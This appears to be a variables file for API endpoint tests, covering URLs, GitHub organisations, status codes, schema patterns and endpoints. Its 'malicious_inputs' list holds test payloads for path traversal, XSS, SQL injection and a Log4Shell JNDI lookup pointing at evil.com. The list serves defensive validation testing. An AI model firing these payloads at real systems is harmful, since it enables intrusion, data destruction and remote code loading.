# API-specific test variables
# These variables are used specifically for API endpoint testing

# API Configuration
variable "api_base_url" {
    default = "http://localhost:8080"
}

variable "api_timeout" {
    default = 30
}

variable "api_user_agent" {
    default = "Hurl-API-Test/1.0"
}

# GitHub API Configuration
variable "github_api_url" {
    default = "https://api.github.com"
}

variable "github_rate_limit_remaining" {
    default = 100
}

# Test Organizations
variable "test_organizations" {
    default = ["microsoft", "golang", "kubernetes"]
}

variable "test_org_primary" {
    default = "microsoft"
}

variable "test_org_secondary" {
    default = "golang"
}

# Test Repositories
variable "test_repo_pattern" {
    default = "^[a-zA-Z0-9_.-]+$"
}

variable "max_repos_per_org" {
    default = 50
}

# API Response Expectations
variable "expected_response_headers" {
    default = {
        "Content-Type" = "application/json"
        "X-RateLimit-Limit" = "5000"
        "X-RateLimit-Remaining" = "*"
    }
}

# Error Response Codes
variable "error_400" {
    default = 400
}

variable "error_401" {
    default = 401
}

variable "error_404" {
    default = 404
}

variable "error_429" {
    default = 429
}

variable "error_500" {
    default = 500
}

# Success Response Codes
variable "success_200" {
    default = 200
}

variable "success_201" {
    default = 201
}

variable "success_204" {
    default = 204
}

# JSON Schema Validation Patterns
variable "org_schema_pattern" {
    default = {
        "type" = "object"
        "required" = ["name", "repositories", "teams", "members"]
    }
}

variable "repo_schema_pattern" {
    default = {
        "type" = "object"
        "required" = ["name", "full_name", "private", "codeowners"]
    }
}

variable "team_schema_pattern" {
    default = {
        "type" = "object"
        "required" = ["name", "slug", "members"]
    }
}

# Performance Benchmarks
variable "response_time_fast" {
    default = 1000
}

variable "response_time_medium" {
    default = 3000
}

variable "response_time_slow" {
    default = 5000
}

# Data Validation Patterns
variable "valid_email_pattern" {
    default = "^[\\w\\.-]+@[\\w\\.-]+\\.[a-zA-Z]{2,}$"
}

variable "valid_url_pattern" {
    default = "^https?://[\\w\\.-]+(?:\\.[a-zA-Z]{2,})+(?:/[\\w\\.-]*)*/?$"
}

variable "valid_github_username_pattern" {
    default = "^[a-zA-Z0-9]([a-zA-Z0-9-]{0,37}[a-zA-Z0-9])?$"
}

# API Pagination
variable "default_page_size" {
    default = 20
}

variable "max_page_size" {
    default = 100
}

variable "first_page" {
    default = 1
}

# Test Data Sets
variable "malicious_inputs" {
    default = [
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "${jndi:ldap://evil.com/a}"
    ]
}

variable "edge_case_inputs" {
    default = [
        "",
        " ",
        "null",
        "undefined",
        "0",
        "-1",
        "999999999999999999999"
    ]
}

# Content Types
variable "content_type_json" {
    default = "application/json"
}

variable "content_type_xml" {
    default = "application/xml"
}

variable "content_type_yaml" {
    default = "application/yaml"
}

variable "content_type_html" {
    default = "text/html"
}

variable "content_type_plain" {
    default = "text/plain"
}

# Authentication
variable "auth_header_name" {
    default = "Authorization"
}

variable "auth_type_bearer" {
    default = "Bearer"
}

variable "auth_type_basic" {
    default = "Basic"
}

# Rate Limiting
variable "rate_limit_window" {
    default = 3600
}

variable "rate_limit_max_requests" {
    default = 5000
}

# Health Check
variable "health_endpoint" {
    default = "/health"
}

variable "health_expected_status" {
    default = "healthy"
}

# Metrics
variable "metrics_endpoint" {
    default = "/metrics"
}

variable "metrics_format" {
    default = "prometheus"
}

# Documentation
variable "docs_endpoint" {
    default = "/docs"
}

variable "openapi_endpoint" {
    default = "/openapi.yaml"
}

# Graph API
variable "graph_endpoint" {
    default = "/graph"
}

variable "graph_format" {
    default = "json"
}

# Scan API
variable "scan_endpoint" {
    default = "/scan"
}

variable "scan_timeout" {
    default = 120
}

# Stats API
variable "stats_endpoint" {
    default = "/stats"
}

variable "stats_aggregation_period" {
    default = "1h"
}